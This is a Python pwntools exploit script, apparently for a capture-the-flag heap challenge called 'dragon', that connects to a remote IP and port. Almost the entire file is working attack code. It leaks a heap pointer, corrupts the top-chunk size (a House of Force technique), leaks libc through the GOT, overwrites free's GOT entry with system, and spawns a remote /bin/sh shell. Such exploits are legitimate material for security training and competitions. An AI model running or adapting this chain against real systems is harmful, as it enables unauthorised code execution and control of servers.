from pwn import *

context.log_level = 'debug'
#context.aslr = False

#io = process('./dragon')
io = remote('58.213.63.30',11501)

e = ELF('./dragon')
#libc = e.libc
libc = ELF('./libc-2.19.so')

def com_gadet(func_ptr, arg1=0, arg2=0, arg3=0):
	addr1 = 0x00401866
	addr2 = 0x00401850
	payload = ''
	payload += p64(addr1) 
	payload += 'A' * 8       # add     rsp, 8
	payload += p64(0x0)      # rbx = 0
	payload += p64(0x1)      # rbp = 1
	payload += p64(func_ptr) # r12
	payload += p64(arg3)     # r13 = rdx = arg3
	payload += p64(arg2)     # r14 = rsi
	payload += p64(arg1)     # r15d = edi
	payload += p64(addr2)    # call *func_ptr
	payload += 'A'* 8 * 7    
	return payload

def answer(recv_buf, send_buf, newline= True):
	io.recvuntil(recv_buf)
	if newline:
		io.sendline(send_buf)
	else:
		io.send(send_buf)



def add_note(name_size, name, content):
	answer('>>', '1')
	answer('size:', str(name_size))
	answer('name:', name)
	answer('content:', content)

def edit_note(id, content, newline=True):
	answer('>>', '2')
	answer('id:', str(id))
	answer('content:', content, newline)

def delete_note(id):
	answer('>>', '3')
	answer('id', str(id))

def list_note(id):
	answer('>>', '4')
	answer('id:', str(id))



add_note(16, 'A'*4, 'A'*4) #  0x20 0x20 0x20
add_note(16, 'A'*4, 'A'*4) #  0x20 0x20 0x20 0x20 0x20 0x20 

# leak heap
edit_note(0, 'A'*32, False) 
list_note(0)
io.recvuntil('A'*32)
buf = io.recv(3)
heap_addr = u32(buf.ljust(4,'\x00'))
log.success('heap:%#x'% heap_addr)



# overlap topchunk size
edit_note(1, 'A'*24 + p64(0xffffffffffffffff), False)

# del 0 
edit_note(0, 'A'*24 + p64(0x21), False)
delete_note(0) 

# add 0, leave only one 0x20 chunk
add_note(32, 'A'*4, 'A'*30)

heap_start = heap_addr - 0x90
log.success('heap_start:%#x'%heap_start)
top_addr = heap_start + 0x120

evil_size = ( heap_start + 0x8 - top_addr - 0x18) 

# b* 0x00400A8A
# x/20gx 0x06020E0
# new 2 
answer('>>', '1')
answer('size:', str(evil_size))
answer('content:', '')



edit_note(2, p64(e.got['puts']))
list_note(0)

io.recvuntil('name: ')
free_addr = u64(io.recv(6).ljust(8, '\x00'))
log.success('free:%#x'% free_addr)


libc.address =  free_addr - libc.symbols['puts']

system_addr = libc.symbols['system']

edit_note(2, 'A'*0x10+ p64(e.got['free']))
edit_note(0, p64(system_addr)[:6])
#gdb.attach(io, 'b *0x00400E35\nb*0x400770')

edit_note(1, '/bin/sh')
delete_note(1)

# add_note(evil_size,'AAAA', 'CCCC')

io.interactive()

